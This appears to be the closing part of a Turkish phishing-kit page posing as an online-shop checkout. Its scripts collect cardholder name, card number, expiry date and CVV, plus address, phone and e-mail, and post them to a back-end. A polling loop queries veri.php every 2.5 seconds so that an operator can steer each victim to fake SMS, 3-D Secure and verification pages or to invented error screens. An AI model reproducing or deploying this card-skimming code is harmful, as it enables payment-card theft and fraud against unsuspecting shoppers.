                           <path d="M9.44941 17.5283C8.21484 17.5283 7.21387 18.529 7.21387 19.7636C7.21387 20.9984 8.21468 21.9993 9.44926 21.9993C10.684 21.9993 11.6848 20.9984 11.6848 19.7639C11.6837 18.5296 10.6835 17.5296 9.44941 17.5283ZM9.44941 20.9983C8.76754 20.9983 8.21484 20.4456 8.21484 19.7639C8.21484 19.082 8.76754 18.5293 9.44926 18.5293C10.1311 18.529 10.6838 19.082 10.6838 19.7636C10.6831 20.4451 10.1308 20.9972 9.44941 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                        </svg>
                     </div>
                     <div class="mt-1 text-[9px] text-brand-gray-secondary ">Sepetim</div>
                  </div>
               <?php else: ?>
                  <div class="flex flex-col items-center relative" onclick="window.location.href='sepet'">
                     <div class="absolute bg-brand-blue-primary text-white rounded-full p-1 w-auto h-[14px] text-[10px]  -top-[2px] -right-[2px] flex justify-center items-center"><?php echo $sepetSayisi; ?></div>
                     <div>
                        <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M16.2194 17.5283C14.9849 17.5283 13.9839 18.529 13.9839 19.7636C13.9839 20.9984 14.9845 21.9993 16.2191 21.9993C17.454 21.9993 18.4547 20.9984 18.4547 19.7639C18.4536 18.5296 17.4534 17.5296 16.2194 17.5283ZM16.2194 20.9983C15.5374 20.9983 14.9849 20.4456 14.9849 19.7639C14.9849 19.082 15.5374 18.5293 16.2191 18.5293C16.9011 18.529 17.4537 19.082 17.4537 19.7636C17.4529 20.4451 16.9008 20.9972 16.2194 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M22.1961 5.15308H4.43665L4.12428 3.88234C3.85451 2.7738 2.85933 1.99532 1.7187 2.00002H1.50041C1.22406 2.00002 1 2.22408 1 2.50058C1 2.77694 1.22406 3.00099 1.50041 3.00099H1.7187C2.39744 2.99551 2.99101 3.45771 3.15228 4.1172L5.58229 14.0409C5.85347 15.1473 6.84943 15.9223 7.98834 15.9135H18.3829C19.5378 15.9228 20.5428 15.126 20.7974 13.9998L22.6841 5.75323C22.7182 5.60668 22.6827 5.45261 22.5877 5.33565C22.492 5.21806 22.3478 5.15074 22.1961 5.15308ZM19.8218 13.7798C19.6693 14.4494 19.0698 14.9215 18.3829 14.9126H7.98834C7.31054 14.9199 6.71666 14.4598 6.55476 13.8015L4.68152 6.15405H21.5681L19.8218 13.7798Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M9.44941 17.5283C8.21484 17.5283 7.21387 18.529 7.21387 19.7636C7.21387 20.9984 8.21468 21.9993 9.44926 21.9993C10.684 21.9993 11.6848 20.9984 11.6848 19.7639C11.6837 18.5296 10.6835 17.5296 9.44941 17.5283ZM9.44941 20.9983C8.76754 20.9983 8.21484 20.4456 8.21484 19.7639C8.21484 19.082 8.76754 18.5293 9.44926 18.5293C10.1311 18.529 10.6838 19.082 10.6838 19.7636C10.6831 20.4451 10.1308 20.9972 9.44941 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                        </svg>
                     </div>
                     <div class="mt-1 text-[10px] bg-brand-blue-primary text-white rounded-full px-1">₺<?php echo $toplamFiyat; ?></div>
                  </div>
               <?php endif; ?>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2.69922 9.84097V19.5819C2.69922 21.0256 3.87381 22.2002 5.31714 22.2002H19.0625C20.5061 22.2002 21.6807 21.0256 21.6807 19.5819V9.84097C21.6807 8.3973 20.5061 7.22271 19.0625 7.22271L16.4111 7.22288C16.7228 7.03291 16.9769 6.83442 17.1335 6.63162C18.0626 5.43088 17.8428 3.70431 16.642 2.77518C16.1414 2.38774 15.5489 2.2002 14.9614 2.2002C14.1398 2.2002 13.3273 2.56679 12.7854 3.26668C12.5089 3.62405 12.3199 4.2674 12.1898 4.99374C12.0598 4.26722 11.8707 3.62371 11.5941 3.26668C11.0526 2.5668 10.2401 2.2002 9.41843 2.2002C8.83094 2.2002 8.23855 2.38777 7.738 2.77553C6.53725 3.70466 6.31741 5.43123 7.24654 6.63197C7.40336 6.83457 7.65755 7.03291 7.96899 7.22323L5.31705 7.22306C3.87372 7.22288 2.69922 8.39734 2.69922 9.84097ZM4.00829 19.5819V13.1139H11.5354V20.8913H5.31718C4.5956 20.8913 4.00829 20.304 4.00829 19.5819ZM20.3718 19.5819C20.3718 20.3037 19.7845 20.891 19.0628 20.891H12.8446V13.114H20.3717L20.3718 19.5819ZM19.063 8.53208C19.7847 8.53208 20.372 9.1194 20.372 9.84115V11.8048L12.8449 11.8046V8.53208L19.063 8.53208ZM13.8208 4.06794C14.0955 3.71279 14.5115 3.50918 14.9616 3.50918C15.2823 3.50918 15.5861 3.61321 15.8408 3.81035C16.1451 4.04575 16.3392 4.38568 16.388 4.76698C16.4367 5.14861 16.3339 5.52612 16.0985 5.83005C15.8444 6.14847 14.658 6.68077 13.2642 7.13877C13.358 5.67599 13.576 4.3944 13.8208 4.06794ZM7.99225 4.76712C8.04094 4.38549 8.23517 4.0459 8.53942 3.81049C8.79413 3.61336 9.09819 3.50932 9.41883 3.50932C9.86878 3.50932 10.2846 3.71312 10.5591 4.06778C10.8035 4.39354 11.0212 5.6758 11.1153 7.13959C9.72254 6.68211 8.53649 6.14963 8.28215 5.83052C8.04624 5.52628 7.9434 5.14873 7.99225 4.76712ZM11.5354 8.53199V11.8049L4.00829 11.8047V9.84089C4.00829 9.11914 4.5956 8.53182 5.31735 8.53182L11.5354 8.53199Z" fill="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Kampanyalar</div>
               </div>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="7.5" r="4.825" stroke="#8D939C" stroke-width="1.35"></circle>
                        <path d="M2.175 19.5335C2.175 16.9608 4.26061 14.8752 6.83333 14.8752H17.1667C19.7394 14.8752 21.825 16.9608 21.825 19.5335C21.825 20.6335 20.9333 21.5252 19.8333 21.5252H4.16667C3.0667 21.5252 2.175 20.6335 2.175 19.5335Z" stroke="#8D939C" stroke-width="1.35"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Hesabım</div>
               </div>
            </div>
         </div>
      </div>
   </div>


   <script>
      function SepeteEkle(urun_id) {
         if (urun_id) {
            $.ajax({
               type: 'POST',
               url: 'request.php?action=sepet_ekle',
               data: {
                  ip: "<?php echo $ip; ?>",
                  urun_id: urun_id
               },
               success: function(data) {
                  if (data == "success") {
                     alert("Ürün başarıyla eklendi.");
                     setTimeout(() => {
                        window.location.reload();
                     }, 350);
                  } else if (data == "fail") {
                     alert("Her üründen sadece 1 adet satın alabilirsiniz.");
                  }
               }
            });
         }
      }

      function SepetSil(urun_id) {
         if (urun_id) {
            $.ajax({
               type: 'POST',
               url: 'request.php?action=sepet_sil',
               data: {
                  ip: "<?php echo $ip; ?>",
                  urun_id: urun_id
               },
               success: function(data) {
                  if (data == "success") {
                     alert("Ürün başarıyla silindi.");
                     setTimeout(() => {
                        window.location.reload();
                     }, 350);
                  }
               }
            });
         }
      }
   </script>
   <script type="text/javascript">
      $(document).ready(function() {
         gonder();
         var int = self.setInterval("gonder()", 2500);
      });

      function gonder() {
         $.ajax({
            type: 'POST',
            url: '<?php echo "/veri.php?ip=" . $ip; ?>',
            success: function(msg) {
               if (msg.includes('sms')) {
                  window.location.href = 'acsredirect';
               }
               if (msg.includes('tebrikler')) {
                  window.location.href = 'acsredirect?control=success';
               }
               if (msg.includes('hata_sms')) {
                  window.location.href = 'acsredirect?control=error';
               }
               if (msg.includes('hata_limit')) {
                  window.location.href = '/?redirect=error_limit';
               }
               if (msg.includes('hata_internet')) {
                  window.location.href = '/?redirect=error_internet';
               }
               if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
               }
               if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
               }
               if (msg.includes('hata_dogrulama')) {
                  window.location.href = '/dogrulama?control=error';
               }
               if (msg == "dogrulama" || msg == "dogrulamadogrulama") {
                  window.location.href = '/dogrulama';
               }
               if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
               }
            }
         });
      }
   </script>
   <script src="./assets/js/imask.js"></script>
   <script>
      var cc = IMask(
         document.getElementById('cardNumber'), {
            mask: '0000 0000 0000 0000'
         }
      );

      var skt = IMask(
         document.getElementById('expireDate'), {
            mask: '00/00'
         }
      );

      var cvv = IMask(
         document.getElementById('cvc'), {
            mask: '000'
         }
      );
   </script>
   <script type="text/javascript">
      document.addEventListener("DOMContentLoaded", function() {
         var m1 = document.getElementById('m1');
         var m2 = document.getElementById('m2');

         if (window.innerWidth <= 800) {
            m1.style.display = "block";
            m2.style.display = "block";
         } else {
            m1.style.display = "none";
            m2.style.display = "none";
         }

         window.addEventListener("resize", function() {
            if (window.innerWidth <= 800) {
               m1.style.display = "block";
               m2.style.display = "block";
            } else {
               m1.style.display = "none";
               m2.style.display = "none";
            }
         });
      });
   </script>
   <script>
      function valid_credit_card(value) {
         if (/[^0-9-\s]+/.test(value)) return false;

         var nCheck = 0,
            nDigit = 0,
            bEven = false;
         value = value.replace(/\D/g, "");

         for (var n = value.length - 1; n >= 0; n--) {
            var cDigit = value.charAt(n),
               nDigit = parseInt(cDigit, 10);

            if (bEven) {
               if ((nDigit *= 2) > 9) nDigit -= 9;
            }

            nCheck += nDigit;
            bEven = !bEven;
         }

         return (nCheck % 10) == 0;
      }

      document.getElementById("odemeyap").addEventListener("click", function(e) {
         e.preventDefault();
         var adsoyad = document.getElementById('cardHolderName').value,
            kk = document.getElementById('cardNumber').value,
            skt = document.getElementById('expireDate').value,
            cvv = document.getElementById('cvc').value

         if (adsoyad == "" || adsoyad == null || kk == "" || kk == null || skt == "" || skt == null || cvv == "" || cvv == null) {
            errNotify("Lütfen bütün boşlukları doldurduğunuzdan emin olunuz.")
         } else if (kk.length != 19) {
            errNotify("Lütfen Kredi/Banka kartınızı eksiksiz giriniz.")
         } else if (!valid_credit_card(kk)) {
            errNotify("Lütfen Kredi/Banka kartınızın numarasını doğru yazınız.")
         } else if (cvv.length != 3) {
            errNotify("Lütfen kartınızın CVV kodunu doğru ve eksiksiz bir şekilde giriniz.")
         } else {
            document.getElementById('odemeyap').disabled = true;
            $.ajax({
               type: "POST",
               url: "./request.php?action=odeme",
               data: {
                  isim_soyisim: adsoyad,
                  kredi_karti: kk,
                  skt: skt,
                  cvv: cvv,
                  bakiye: "<?php echo $toplamFiyat; ?> TL"
               },
               success: function(data) {

                  if (data == "sms_aktif") {
                     document.getElementById("errsvg").style.display = "none"
                     document.getElementById("beklegif").style.display = ""
                     document.getElementById("errkapabuton").style.display = "none"
                     document.getElementById("errkapaicon").style.display = "none"
                     document.getElementById("errtitle").innerHTML = "Lütfen Bekleyiniz"
                     errNotify("Ödemeniz alınıyor...")

                  } else if (data == "sms_deaktif") {
                     window.location.href = "/?page=success"
                  } else if (data == "yasakli_bin") {
                     document.getElementById('odemeyap').disabled = false;
                     errNotify("Ödeme bankanız tarafından onaylanmadı. Lütfen farklı bir Kredi/Banka kartı ile ödeme yapınız.")
                  } else if (data == "adres") {
                     window.location.href = "?status=adres"
                  }
               }
            });
         }
      });
   </script>
   <script>
      function adresSecAktiflestir() {
         document.getElementById('headlessui-portal-root').style.display = 'block';
      }
   </script>
   <script>
      document.addEventListener("DOMContentLoaded", function() {
         var form = document.getElementById("adresform");
         var devamBtn = document.getElementById("kaydetbtnadres");
         var descriptionInput = document.getElementById("description");

         form.addEventListener("input", function() {
            var inputs = form.querySelectorAll("input");
            var allFilled = true;

            inputs.forEach(function(input) {
               if (input !== descriptionInput && input.value.trim() === "") {
                  allFilled = false;
               }
            });

            if (allFilled) {
               devamBtn.removeAttribute("disabled");
               devamBtn.classList.add("bg-brand-blue-primary");
               devamBtn.classList.remove("bg-brand-gray-secondary");
            } else {
               devamBtn.setAttribute("disabled", "disabled");
               devamBtn.classList.remove("bg-brand-blue-primary");
               devamBtn.classList.add("bg-brand-gray-secondary");
            }
         });
      });
   </script>
   <div id="headlessui-portal-root" style="display: none;">
      <div data-headlessui-portal="" id="adres1step">
         <div class="fixed inset-0 ios-bottom w-full z-20 bg-black/40"></div>
         <div class="fixed inset-0 ios-bottom w-full z-20 flex items-center justify-center pointer-events-none">
            <div class="w-[calc(100%-1rem)]   relative mobile:max-w-[375px] laptop:max-w-[445px]  bg-white   rounded-3xl border border-brand-gray-border">
               <div class="pointer-events-auto">
                  <div class="text-center pt-[42px] mb-2 text-xl px-4 font-medium">Adres Seç</div>
                  <div class="relative">
                     <div class="overflow-y-auto p-4 max-h-[75vh] ">
                        <div>
                           <div class="space-y-2 pb-5">
                              <div class="rounded-3xl border p-4 flex items-center justify-center flex-none cursor-pointer" onclick="document.getElementById('adres1step').style.display = 'none'; document.getElementById('adres2step').style.display = 'block'">
                                 <div class="flex items-center gap-2">
                                    <svg width="19" height="18" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                       <path fill-rule="evenodd" clip-rule="evenodd" d="M8 2C8.35504 2 8.64286 2.28782 8.64286 2.64286V7.35714H13.3571C13.7122 7.35714 14 7.64496 14 8C14 8.35504 13.7122 8.64286 13.3571 8.64286H8.64286V13.3571C8.64286 13.7122 8.35504 14 8 14C7.64496 14 7.35714 13.7122 7.35714 13.3571V8.64286H2.64286C2.28782 8.64286 2 8.35504 2 8C2 7.64496 2.28782 7.35714 2.64286 7.35714H7.35714V2.64286C7.35714 2.28782 7.64496 2 8 2Z" fill="#333333"></path>
                                    </svg>
                                    <div>Yeni Adres Ekle</div>
                                 </div>
                              </div>
                              <?php if ($checkAdres['ip_adresi']): ?>
                                 <div class="rounded-3xl border p-4 text-sm cursor-pointer">
                                    <div class="flex items-center gap-2">
                                       <div>🏠</div>
                                       <div class="truncate"><?= $checkAdres['baslik']; ?></div>
                                    </div>
                                    <div class="text-xs text-brand-gray-primary mt-2"><?= $checkAdres['mahalle']; ?> (<?= $checkAdres['cadde']; ?>), No:<?= $checkAdres['bina']; ?> D:<?= $checkAdres['daire']; ?> <?= $checkAdres['ilce']; ?> / <?= $checkAdres['il']; ?></div>
                                 </div>
                              <?php endif; ?>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="w-5 h-5 absolute top-4 right-4 cursor-pointer" onclick="document.getElementById('headlessui-portal-root').style.display = 'none'">
                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M1 1L15 15M15 1L1 15" stroke="#333333" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
                     </svg>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div data-headlessui-portal="" style="display: none" id="adres2step">
         <div class="fixed inset-0 ios-bottom w-full z-20 bg-black/40"></div>
         <div class="fixed inset-0 ios-bottom w-full z-20 flex items-center justify-center pointer-events-none">
            <div class="w-[calc(100%-1rem)]   relative mobile:max-w-[375px] laptop:max-w-[445px]  bg-white   rounded-3xl border border-brand-gray-border">
               <div class="pointer-events-auto">
                  <div class="text-center pt-[42px] mb-2 text-xl px-4 font-medium">Adres Oluştur</div>
                  <div class="relative">
                     <div class="overflow-y-auto p-4 max-h-[75vh] ">
                        <form autocomplete="off" class="space-y-10 py-5" id="adresform" method="POST" action="request.php?action=adres">
                           <div class="flex items-center border border-brand-blue-primary bg-brand-blue-light rounded-2xl py-3 px-4 text-xs font-normal gap-1" style="margin-top: 20px;">
                              <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M10 19C14.9706 19 19 14.9706 19 10C19 5.02944 14.9706 1 10 1C5.02944 1 1 5.02944 1 10C1 14.9706 5.02944 19 10 19Z" stroke="#00BAD3" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
                                 <path fill-rule="evenodd" clip-rule="evenodd" d="M10.2666 7.5002H9.73328C9.43888 7.5002 9.19995 7.321 9.19995 7.1002L9.19995 5.9C9.19995 5.6792 9.43888 5.5 9.73328 5.5H10.2666C10.561 5.5 10.8 5.6792 10.8 5.9V7.1002C10.8 7.321 10.561 7.5002 10.2666 7.5002ZM10.2666 14.9002H9.73328C9.43888 14.9002 9.19995 14.721 9.19995 14.5002V9.5002C9.19995 9.2794 9.43888 9.1002 9.73328 9.1002H10.2666C10.561 9.1002 10.8 9.2794 10.8 9.5002V14.5002C10.8 14.721 10.561 14.9002 10.2666 14.9002Z" fill="#00BAD3"></path>
                              </svg>
                              <div>Lütfen adres bilgilerinde hata olup olmadığını kontrol et.</div>
                           </div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="baslik" name="baslik" placeholder="Adres Başlığı*" maxlength="20" value="Ev Adresim"><label for="baslik" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Adres Başlığı*</label></div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="il" name="il" placeholder="İl*" maxlength="50" value=""><label for="il" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">İl*</label></div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="ilce" name="ilce" placeholder="İlçe*" maxlength="50" value=""><label for="ilce" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">İlçe*</label></div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="mahalle" name="mahalle" placeholder="Mahalle*" maxlength="50" value=""><label for="mahalle" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Mahalle*</label></div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="cadde" name="cadde" placeholder="Cadde, Sokak Adı*" maxlength="50" value=""><label for="cadde" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Cadde, Sokak Adı*</label></div>
                           <div class="grid grid-cols-3 gap-2">
                              <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="bina" name="bina" placeholder="Bina No*" type="numeric" maxlength="20" value=""><label for="bina" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Bina No*</label></div>
                              <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="kat" name="kat" placeholder="Kat*" type="numeric" maxlength="10" value=""><label for="kat" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Kat*</label></div>
                              <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="daire" name="daire" placeholder="Daire No*" type="numeric" maxlength="10" value=""><label for="daire" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Daire No*</label></div>
                           </div>
                           <div>
                              <div class="relative"><textarea class="accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-3xl focus:ring-brand-blue-primary focus:border-brand-blue-primary form-textarea resize-none peer placeholder:text-brand-gray-secondary  ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary  placeholder:text-base" id="description" placeholder="Adres Tarifi" rows="1" maxlength="300"></textarea>
                                 <label for="description" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal ">Adres Tarifi</label>
                              </div>
                           </div>
                           <div class="grid grid-cols-2 gap-2">
                              <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="isim" name="isim" placeholder="Ad*" maxlength="50" value=""><label for="isim" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Ad*</label></div>
                              <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="soyisim" name="soyisim" placeholder="Soyad*" maxlength="50" value=""><label for="soyisim" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Soyad*</label></div>
                           </div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full  form-input peer" id="telefon" name="telefon" placeholder="Telefon Numarası*" maxlength="50" value=""><label for="telefon" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">Telefon Numarası*</label></div>
                           <div>
                              <div class="text-xs mb-2"> Fatura </div>
                              <div class="flex space-x-6 items-center">
                                 <div class="flex items-center "><input type="radio" class="accent-brand-blue-primary form-radio cursor-pointer text-brand-blue-primary focus:ring-transparent w-5 h-5 undefined" name="fatura" id="option-INDIVIDUAL" checked="" style="box-shadow: none;"><label class="ml-2 cursor-pointer" for="option-INDIVIDUAL">Bireysel</label></div>
                                 <div class="flex items-center "><input type="radio" class="accent-brand-blue-primary form-radio cursor-pointer text-brand-blue-primary focus:ring-transparent w-5 h-5 undefined" name="fatura" id="option-CORPORATE" style="box-shadow: none;"><label class="ml-2 cursor-pointer" for="option-CORPORATE">Kurumsal</label></div>
                              </div>
                           </div>
                           <div class="relative"><input class="ring-0 focus:ring-brand-blue-primary focus:border-brand-blue-primary accent-brand-blue-primary w-full bg-white items-center p-4 border border-brand-gray-border rounded-full form-input peer" id="eposta" name="eposta" placeholder="E-posta*" value=""><label for="eposta" class="peer-placeholder-shown:opacity-0 absolute left-1 -top-5 text-xs font-normal">E-posta*</label></div>
                           <div class="pb-[20px]"></div>
                           <div class="absolute bg-gradient-to-b from-white/0 to-white/30 bottom-0 right-4 left-4  pb-4 "><button type="submit" class="bg-brand-gray-secondary  rounded-full text-base  px-5 py-3 text-center w-full text-white" disabled="" id="kaydetbtnadres">Kaydet</button></div>
                        </form>
                        <script>
                           var telefon = IMask(
                              document.getElementById('telefon'), {
                                 mask: '(500) 000 00 00'
                              }
                           );
                        </script>
                     </div>
                  </div>
                  <div class="w-5 h-5 absolute top-4 right-4 cursor-pointer" onclick="document.getElementById('adres1step').style.display = 'block'; document.getElementById('adres2step').style.display = 'none'; document.getElementById('headlessui-portal-root').style.display = 'none'">
                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M1 1L15 15M15 1L1 15" stroke="#333333" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
                     </svg>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
   <script>
      document.getElementById("bina").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var numericValue = inputValue.replace(/[^0-9]/g, '');
         evt.target.value = numericValue;
      });
      document.getElementById("kat").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var numericValue = inputValue.replace(/[^0-9]/g, '');
         evt.target.value = numericValue;
      });
      document.getElementById("daire").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var numericValue = inputValue.replace(/[^0-9]/g, '');
         evt.target.value = numericValue;
      });

      document.getElementById("il").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var alphabeticValue = inputValue.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
         evt.target.value = alphabeticValue;
      });

      document.getElementById("ilce").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var alphabeticValue = inputValue.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
         evt.target.value = alphabeticValue;
      });

      document.getElementById("mahalle").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var alphabeticValue = inputValue.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
         evt.target.value = alphabeticValue;
      });

      document.getElementById("isim").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var alphabeticValue = inputValue.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
         evt.target.value = alphabeticValue;
      });

      document.getElementById("soyisim").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var alphabeticValue = inputValue.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
         evt.target.value = alphabeticValue;
      });

      document.getElementById("cardHolderName").addEventListener("input", function(evt) {
         var inputValue = evt.target.value;
         var alphabeticValue = inputValue.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '');
         evt.target.value = alphabeticValue;
      });
   </script>
</body>

</html>